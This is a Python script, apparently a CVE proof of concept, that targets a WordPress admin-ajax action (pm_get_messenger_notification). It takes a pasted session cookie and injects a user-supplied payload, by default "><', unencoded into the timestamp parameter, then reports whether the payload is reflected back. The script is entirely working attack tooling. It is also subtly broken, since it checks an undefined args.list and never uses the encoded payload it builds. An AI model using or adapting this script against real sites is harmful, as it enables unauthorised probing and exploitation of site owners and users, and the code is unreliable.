import requests
import argparse
import urllib.parse
import os

print(
r'''
 ▗▄▄▖▗▖  ▗▖▗▄▄▄▖    ▄▄▄▄ ▄▀▀▚▖▄▄▄▄ ▄▄▄▄ ▄▄▄▄ ▄▄▄▄ ▗▄▄▄▖▗▄▄▄▖
▐▌   ▐▌  ▐▌▐▌          █ █  ▐▌   █ █    █    █  █    ▐▌   ▐▌
▐▌   ▐▌  ▐▌▐▛▀▀▘    █▀▀▀ █  ▐▌█▀▀▀ ▀▀▀█ █▀▀█ ▀▀▀█    ▐▌   ▐▌
▝▚▄▄▖ ▝▚▞▘ ▐▙▄▄▖    █▄▄▄ ▀▄▄▞▘█▄▄▄ ▄▄▄█ █▄▄█ ▄▄▄█    ▐▌   ▐▌
                                                            
                                                            
▗▖   ▄   ▄     ▗▞▀▘▗▞▀▜▌▄▄▄▄  ▄    ■  ▗▞▀▚▖▄   ▄            
▐▌   █   █     ▝▚▄▖▝▚▄▟▌█   █ ▄ ▗▄▟▙▄▖▐▛▀▀▘█   █            
▐▛▀▚▖ ▀▀▀█              █   █ █   ▐▌  ▝▚▄▄▖ ▀▀▀█            
▐▙▄▞▘▄   █                    █   ▐▌       ▄   █            
      ▀▀▀                         ▐▌        ▀▀▀             
'''


        )

def get_single(target, payload):
    inpt = input("Enter session cookie: ")
    cookies = dict(item.split("=") for item in inpt.split("; "))
    payloadEncoded = urllib.parse.quote(payload)
    resp = requests.get(f"{target}/wp-admin/admin-ajax.php?action=pm_get_messenger_notification&timestamp={payload}&activity=asdfasdfasdf&tid=1", cookies=cookies)
    print(resp.text)

    return (target, resp.status_code, payload in resp.text)

def print_output(target, status_code, payload_visible):
    print(f"\033[0;32m[+]\033[0;0m {target} :[{status_code}]: payload printed ({payload_visible})")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument(
        "-t",
        "--target",
        help="Specify a single target"
    )

    parser.add_argument(
            "-p",
            "--payload",
            help="specify custom payload",
            default="><'",
            )

    args = parser.parse_args()

    if not args.target and not args.list:
        parser.print_help()
    if args.target and args.list:
        parser.print_help()

    payload = args.payload
    


    if args.target:
        target = args.target
        target, status_code, visible= get_single(target, payload)
        print_output(target, status_code, visible)


